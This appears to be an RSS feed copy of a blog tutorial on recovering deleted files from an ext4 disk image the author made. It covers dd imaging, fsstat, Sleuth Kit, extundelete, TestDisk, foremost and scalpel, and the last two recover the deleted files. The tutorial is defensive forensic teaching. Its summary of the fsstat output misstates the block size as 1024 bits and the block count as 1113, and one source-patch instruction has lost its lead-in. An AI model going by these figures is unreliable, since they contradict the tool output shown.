&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Reserved Blocks Before Block Groups: 1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Free Blocks: 9223  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BLOCK GROUP INFORMATION  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--------------------------------------------  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Number of Block Groups: 2  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Inodes per group: 1392  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Blocks per group: 8192  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Group: 0:  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Block Group Flags: [INODE\_ZEROED]   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Inode Range: 1 - 1392  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Block Range: 1 - 8192  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Layout:  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Super Block: 1 - 1  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Group Descriptor Table: 2 - 2  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Group Descriptor Growth Blocks: 3 - 89  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Data bitmap: 90 - 90  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Inode bitmap: 92 - 92  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Inode Table: 94 - 441  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Uninit Data Bitmaps: 92 - 105  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Uninit Inode Bitmaps: 94 - 107  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Uninit Inode Table: 790 - 5661  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Data Blocks: 5690 - 8192  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Free Inodes: 1381 (99%)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Free Blocks: 6365 (77%)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Total Directories: 2  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Stored Checksum: 0x7DEB  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Group: 1:  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Block Group Flags: [INODE\_UNINIT, INODE\_ZEROED]   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Inode Range: 1393 - 2784  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Block Range: 8193 - 11139  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Layout:  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Super Block: 8193 - 8193  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Group Descriptor Table: 8194 - 8194  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Group Descriptor Growth Blocks: 8195 - 8281  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Data bitmap: 91 - 91  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Inode bitmap: 93 - 93  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Inode Table: 442 - 789  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Data Blocks: 8282 - 11139  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Free Inodes: 1392 (100%)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Free Blocks: 2858 (96%)  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Total Directories: 0  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; Stored Checksum: 0xDFA7
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Based on this output, it is clear that the block size is 1024 bits, there are 1113 total blocks, and there are 2785 inodes.&lt;/p&gt;
&lt;p&gt;In addition, &lt;code&gt;parted&lt;/code&gt; can be used to find more information on the partition table, which can be useful when using scalpel.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*EAJIlLWQ5g3rEgqc5nPNbQ.png&#34; alt=&#34;&#34;  /&gt;

Finally, running &lt;code&gt;strings&lt;/code&gt; on the image gives more insight as to what is in the filesystem. It appears that my &lt;code&gt;secret.txt&lt;/code&gt; file with the contents &lt;code&gt;Hello World&lt;/code&gt; is appearing from the &lt;code&gt;strings&lt;/code&gt; command in addition to a failed image download attempt.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*hINgjWeGy7ttVHl1qDs1EQ.png&#34; alt=&#34;&#34;  /&gt;

In the command &lt;code&gt;strings -a --radix=d sdb.img&lt;/code&gt;, &lt;code&gt;-a&lt;/code&gt; is an option to scan the entire file and &lt;code&gt;--radix=d&lt;/code&gt; tells &lt;code&gt;strings&lt;/code&gt; to show the offset that the string was found at in base 10.&lt;/p&gt;
&lt;h2 id=&#34;analyzing-thefiles&#34;&gt;Analyzing the Files&lt;/h2&gt;
&lt;p&gt;This particular image does not have any files currently in it aside from deleted files, so there isn’t much information to gain from mounting it and analyzing the files. In cases where it is desireable to do so, the following command can be used:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ mount -o ro,loop,noexec,noatime sdb.img
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Below, I’ll explain what the options do:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-o&lt;/code&gt;: sets the options for mounting &lt;code&gt;sdb.img&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ro&lt;/strong&gt;: an option to mount the file system as being read-only&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;loop&lt;/strong&gt;: mount the file system on a loop device&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;noexec&lt;/strong&gt;: disallow execution&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;noatime&lt;/strong&gt;: don’t change the access time of the files&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;You can then continue to run &lt;code&gt;file&lt;/code&gt; on the files within the mounted loop device and save their md5 hashes to verify integrity.&lt;/p&gt;
&lt;h1 id=&#34;recovering-thefiles&#34;&gt;Recovering the Files&lt;/h1&gt;
&lt;h2 id=&#34;method-1-using-sleuthkithttpsleuthkitorgsleuthkit&#34;&gt;Method 1: Using &lt;a href=&#34;http://sleuthkit.org/sleuthkit/&#34;&gt;Sleuth Kit&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Often, if you have deleted files, they may be displayed with &lt;code&gt;fls sdb.img&lt;/code&gt;, enumerated with &lt;code&gt;istat -o &amp;lt;offset&amp;gt; sdb.img &amp;lt;inode_number&amp;gt;&lt;/code&gt;, and recovered with &lt;code&gt;icat -o &amp;lt;offset&amp;gt; sdb.img &amp;lt;inode_number&amp;gt;&lt;/code&gt;. An example of the latter 2 steps are shown in the screenshot below.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*mc44fgKV8os0qCVpYYZiJQ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://www.therootuser.com/wp-content/uploads/2017/11/Screenshot-2017-11-07-17.27.58.png&#34;&gt;https://www.therootuser.com/wp-content/uploads/2017/11/Screenshot-2017-11-07-17.27.58.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This does not appear to be the case for me, however. My deleted files are not appearing from the &lt;code&gt;fls&lt;/code&gt; command. Instead, I see a variable called &lt;code&gt;$OrphanFiles&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*hQXtm0cZ7wge3IgQlexR-Q.png&#34; alt=&#34;&#34;  /&gt;

&lt;code&gt;$OrphanFiles&lt;/code&gt; are files that still exist in the image, but are no longer able to be accessed from the root directory. &lt;code&gt;$OrphanFiles&lt;/code&gt; is not an actual directory on the image, it is Sleuth Kit’s virtual way to demonstrate that the file metadata still exists (&lt;a href=&#34;https://wiki.sleuthkit.org/index.php?title=Orphan_Files&#34;&gt;read more&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;To recover these orphan files, I will attempt a few techniques starting with &lt;code&gt;extundelete&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;method-2-extundeletehttpsextundeletesourceforgenet&#34;&gt;Method 2: &lt;a href=&#34;https://extundelete.sourceforge.net/&#34;&gt;Extundelete&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;This tool can be used to recover files on ext3 and ext4 filesystems. I was having some difficulties with the build from &lt;code&gt;apt&lt;/code&gt;, so I build the program from source with the following commands to it working again:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt update &amp;amp;&amp;amp; apt install -y libext2fs-dev   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://github.com/cherojeong/extundelete.git  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./configure  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;make  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;src/extundelete --restore-all /path/to/image.img
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;os &amp;lt;&amp;lt; “Directory ACL: “ &amp;lt;&amp;lt; inode.i_dir_acl &amp;lt;&amp;lt; std::endl;&lt;/code&gt; with &lt;code&gt;os &amp;lt;&amp;lt; “Directory ACL: “ &amp;lt;&amp;lt; inode.i_file_acl &amp;lt;&amp;lt; std::endl;&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The command &lt;code&gt;extundelete --restore-all sdb.img&lt;/code&gt; can be used to recover files.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Ipv-ABMSCpXNtc6PZT5zqQ.png&#34; alt=&#34;&#34;  /&gt;

As you can see in the screenshot above, the tool was unsuccessful in recovering the orphan files. This is still a viable option that can work in many scenarios which is why I decided to include it in this article.&lt;/p&gt;
&lt;p&gt;I’m not giving up yet. We’ll try again!&lt;/p&gt;
&lt;h2 id=&#34;method-3testdiskhttpswwwcgsecurityorgwikitestdisk&#34;&gt;Method 3: &lt;a href=&#34;https://www.cgsecurity.org/wiki/TestDisk&#34;&gt;TestDisk&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The &lt;code&gt;.tar.bz&lt;/code&gt; file can be downloaded &lt;a href=&#34;https://www.cgsecurity.org/wiki/TestDisk_Download&#34;&gt;here&lt;/a&gt;. I’m using version 7.2. Note that in order for &lt;code&gt;TestDisk&lt;/code&gt; to work, you must run it in the download directory. Otherwise you might get an error like &lt;code&gt;*** Error in &lt;/code&gt;/path/to/testdisk-7.2-WIP/photorec_static&amp;rsquo;: malloc(): memory corruption: 0x0000000002617d29 ***`.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;# extract and run the file  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tar -xf testdisk-7.2-WIP.linux26-x86\_64.tar.bz2  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd testdisk-7.2-WIP  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./photorec\_static /path/to/sdb.img /log 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A help menu will appear. I’ll first select the image that I want to work with.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*vEuqI7RnAWsvLfrH9n88Pw.png&#34; alt=&#34;&#34;  /&gt;

Then, I select the option for the partition table for the media. Mine does not have one, so I choose “None”. I verified that this was the only option that was able to list files for me.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*c5iJeI2oyLMdmRu_bBD5Qg.png&#34; alt=&#34;&#34;  /&gt;

After this, I navigate to the “List” option at the bottom of the terminal and press &lt;code&gt;Enter&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*jl17is949wOoNF0JEzBcIg.png&#34; alt=&#34;&#34;  /&gt;

This leads me to the listing of the files on the image with the successfully recovered ones in &lt;strong&gt;red&lt;/strong&gt; text.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*yYQEslxR1RWkUbkEX743Bg.png&#34; alt=&#34;&#34;  /&gt;

As you can see in the screenshot, there are no new files there listed in red. This means that &lt;code&gt;TestDisk&lt;/code&gt; was unsuccessful in recovering the deleted files.&lt;/p&gt;
&lt;p&gt;It’s okay, I still got a few more tricks up my sleeve.&lt;/p&gt;
&lt;h2 id=&#34;method-4foremosthttpssourceforgenetprojectsforemost&#34;&gt;Method 4: &lt;a href=&#34;https://sourceforge.net/projects/foremost/&#34;&gt;Foremost&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Foremost can be installed with &lt;code&gt;apt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt install foremost
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This tool uses a technique known as &lt;strong&gt;file carving&lt;/strong&gt; which involves searching through the raw data on a disk and carving out the values between the header and/or footer of the file.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ayacIY6WQdxAYksd_nwT8g.png&#34; alt=&#34;&#34;  /&gt;

Alas, we were able to recover a deleted image file from the drive with &lt;code&gt;foremost -t jpeg -o recovered-files -i sdb.img&lt;/code&gt;. The recovered image renders as expected in the Image Viewer. What a pretty camp fire.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*kA2aubO7prDBFW9Xx0cGvQ.png&#34; alt=&#34;&#34;  /&gt;

The fact that this worked while the previous 3 methods did not further demonstrates that different tools and techniques will be more effective at data recovery in different scenarios.&lt;/p&gt;
&lt;p&gt;It’s also worth mentioning that you can edit the &lt;code&gt;/etc/foremost.conf&lt;/code&gt; file to contain your own custom headers and footers for the file you are looking for. Modifying these values will be explored in the next and final method.&lt;/p&gt;
&lt;h2 id=&#34;method-5scalpelhttpsgithubcomsleuthkitscalpel&#34;&gt;Method 5: &lt;a href=&#34;https://github.com/sleuthkit/scalpel&#34;&gt;Scalpel&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Scalpel is much like Foremost with added flexibility. You are not as limited on the file types and headers, although there is a way to modify foremost to have the same customization that scalpel provides.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt install scalpel  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cp /etc/scalpel/scalpel.conf .  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim scalpel.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I’ll edit the config with the bit of background information that I have. I know that I’m attempting to recover a JPEG file and I also know that there was a text file that began with the word “Hello”. By using &lt;code&gt;xxd&lt;/code&gt;, I can determine the file headers for a &lt;code&gt;.txt&lt;/code&gt; file starting with the word “Hello”. In this case, it would be &lt;code&gt;\x48\x65\x6c\x6c\x6f&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ echo -n Hello | xxd   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000000: 4865 6c6c 6f Hello.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We will use this information to update the &lt;code&gt;scalpel.conf&lt;/code&gt; file in &lt;code&gt;vim&lt;/code&gt;. As explained in the comments at the top of the config file, the first column indicates the file extension. The second is whether the header and footer are case sensitive, the third is the header in hexadecimal bytes, the fourth column is an optional footer, and the fifth column is an optional parameter to search backwards from the header rather than just forward.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Y6kTU1JxILxivTOYbHN5tQ.png&#34; alt=&#34;&#34;  /&gt;

With these options set, &lt;code&gt;scalpel&lt;/code&gt; can now be ran to extract these files from the drive.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;scalpel -o recovered-files\_scalpel -c scalpel.conf sdb.img
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*O3huS4-S2BausvT-s2KiYw.png&#34; alt=&#34;&#34;  /&gt;

It appears that the text file was successfully recovered.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*jASCyrkTBYVfhWQxZkk3lg.png&#34; alt=&#34;&#34;  /&gt;

The image was recovered as well.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*5ixUUenRR50lIavpZ0oyIw.png&#34; alt=&#34;&#34;  /&gt;

Conclusion&lt;/h1&gt;
&lt;p&gt;There’s many ways to achieve the same outcome. The different tools showcased here have their specific applications where they perform best. Even though not all the methods outlined here worked for my particular situation, that doesn’t mean they won’t work for you. There are many factors that determine whether file recovery will be successful including the partitioning table type, how long it has been since they were deleted, the size of the file (smaller files are more likely to be recovered), the health of the storage device, and the operations that have been done on the drive since deleting the files such as reformatting the drive.&lt;/p&gt;
&lt;p&gt;I hope that through reading this article, you were able to deepen your understanding of file recovery and gain practical knowledge that you can apply in the real world. Thanks for reading and I’ll see you next time.&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<h2 id="computer-forensics-for-filerecovery">Computer Forensics for File Recovery</h2>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*MnBiAcwiwaFGOOAe.jpg" alt=""  />

<em><a href="https://edgy.app/wp-content/uploads/2018/04/dataleakhackerGorodenkoff-970x546.jpg">https://edgy.app/wp-content/uploads/2018/04/dataleakhackerGorodenkoff-970x546.jpg</a></em></p>
<h1 id="introduction">Introduction</h1>
<p>When a file is “deleted”, its contents aren’t typically erased from the storage device that it was stored on. More often than not, the blocks that stored the file are marked as unallocated and the filesystem pointers are removed from it. The implication is that the file still exists on the disk until it is overwritten.</p>
<p>There are many methods to recovering the raw, unallocated data. <a href="https://forensics.wiki/tools_data_recovery/">This website</a> lists many tools that can be used for file recovery in different scenarios. In this article, I’ll be walking through 5 different tools that can be used to recover data.</p>
<h1 id="setup">Setup</h1>
<p>I’ll be using doing forensic analysis on a drive that I created and attached to my Kali Linux VM. To see how this is done, you can reference <a href="https://opensource.com/article/19/4/create-filesystem-linux-partition">this article</a>. On this drive, I saved and then deleted an image file and text file.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*HRHkhSM5bBjI9ouCYNpU4w.png" alt="Image of commands I used to set up file system for forensic analysis"  />

I’ll start by doing general enumeration on the disk image. Then, I’ll showcase a variety of file recovery techniques used by forensic analysts that allowed me to recover the deleted files. Many of the tools used will be from the <a href="http://sleuthkit.org/sleuthkit">Sleuth Kit</a> (TSK).</p>
<p>Before starting, I’ll unmount the filesystem, create a duplicate of it, remove write permissions from the duplicate, and verify the integrity of the duplicate against the original hash of <code>/dev/sdb</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ cd ../ &amp;&amp; umount /mnt/secret # unmount /mnt/secret  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>$ dd if=/dev/sdb of=/home/kali/forensics/sdb.img # copy /dev/sdb into sdb.img  
</span></span><span style="display:flex;"><span>22286+0 records in  
</span></span><span style="display:flex;"><span>22286+0 records out  
</span></span><span style="display:flex;"><span>11410432 bytes (11 MB, 11 MiB) copied, 0.0412053 s, 277 MB/s  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>$ chmod a-w /home/kali/forensics/sdb.img # remove write access to the image  
</span></span><span style="display:flex;"><span>   
</span></span><span style="display:flex;"><span>$ md5sum /home/kali/forensics/sdb.img /dev/sdb  
</span></span><span style="display:flex;"><span>6c49fb21916d59e0df69453959392e23 /home/kali/forensics/sdb.img  
</span></span><span style="display:flex;"><span>6c49fb21916d59e0df69453959392e23 /dev/sdb
</span></span></code></pre></div><h1 id="enumeration">Enumeration</h1>
<h2 id="image-analysis">Image Analysis</h2>
<p>Using the <code>file</code> command reveals that the image uses an ext4 file system.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4gowWgQfJ4J1FXwjFHjhQg.png" alt=""  />

Furthermore, the <code>stat</code> command displays information about the image such as its size, time stamps, and block details.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*_T8VXPuyfnuQ7Rm5WNIOsQ.png" alt="output of the stat command"  />

With the information that the image uses ext4, the <code>fsstat</code> command can be used to extract more detailed information about the file system, metadata, content data, and block groups.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ fsstat -f ext4 sdb.img   
</span></span><span style="display:flex;"><span>FILE SYSTEM INFORMATION  
</span></span><span style="display:flex;"><span>--------------------------------------------  
</span></span><span style="display:flex;"><span>File System Type: Ext4  
</span></span><span style="display:flex;"><span>Volume Name:   
</span></span><span style="display:flex;"><span>Volume ID: dc8a4fb36dce8eabee4c51cf01c2d52a  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>Last Written at: 2023-05-09 22:35:31 (EDT)  
</span></span><span style="display:flex;"><span>Last Checked at: 2023-05-09 22:23:26 (EDT)  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>Last Mounted at: 2023-05-09 22:24:27 (EDT)  
</span></span><span style="display:flex;"><span>Unmounted properly  
</span></span><span style="display:flex;"><span>Last mounted on: /mnt/secret  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>Source OS: Linux  
</span></span><span style="display:flex;"><span>Dynamic Structure  
</span></span><span style="display:flex;"><span>Compat Features: Journal, Ext Attributes, Resize Inode, Dir Index  
</span></span><span style="display:flex;"><span>InCompat Features: Filetype, Extents, 64bit, Flexible Block Groups,   
</span></span><span style="display:flex;"><span>Read Only Compat Features: Sparse Super, Large File, Huge File, Extra Inode Size  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>Journal ID: 00  
</span></span><span style="display:flex;"><span>Journal Inode: 8  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>METADATA INFORMATION  
</span></span><span style="display:flex;"><span>--------------------------------------------  
</span></span><span style="display:flex;"><span>Inode Range: 1 - 2785  
</span></span><span style="display:flex;"><span>Root Directory: 2  
</span></span><span style="display:flex;"><span>Free Inodes: 2773  
</span></span><span style="display:flex;"><span>Inode Size: 256  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>CONTENT INFORMATION  
</span></span><span style="display:flex;"><span>--------------------------------------------  
</span></span><span style="display:flex;"><span>Block Groups Per Flex Group: 16  
</span></span><span style="display:flex;"><span>Block Range: 0 - 11139  
</span></span><span style="display:flex;"><span>Block Size: 1024  
</span></span><span style="display:flex;"><span>Reserved Blocks Before Block Groups: 1  
</span></span><span style="display:flex;"><span>Free Blocks: 9223  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>BLOCK GROUP INFORMATION  
</span></span><span style="display:flex;"><span>--------------------------------------------  
</span></span><span style="display:flex;"><span>Number of Block Groups: 2  
</span></span><span style="display:flex;"><span>Inodes per group: 1392  
</span></span><span style="display:flex;"><span>Blocks per group: 8192  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>Group: 0:  
</span></span><span style="display:flex;"><span> Block Group Flags: [INODE\_ZEROED]   
</span></span><span style="display:flex;"><span> Inode Range: 1 - 1392  
</span></span><span style="display:flex;"><span> Block Range: 1 - 8192  
